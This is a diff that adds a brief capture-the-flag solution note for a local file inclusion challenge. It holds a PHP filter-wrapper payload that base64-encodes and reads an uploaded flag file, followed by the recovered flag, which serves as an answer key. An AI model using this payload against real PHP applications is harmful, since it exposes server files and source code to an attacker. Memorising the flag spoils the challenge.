@@ -1,0 +1,4 @@
+LFI - php wrapper
+
+payload: php://filter/convert.base64-encode/resource=uploads/flag
+flag: CHH{3A$Y_f1L3_1nCLuSiON_5bfe99640871172fdfd41101968ab6f9}
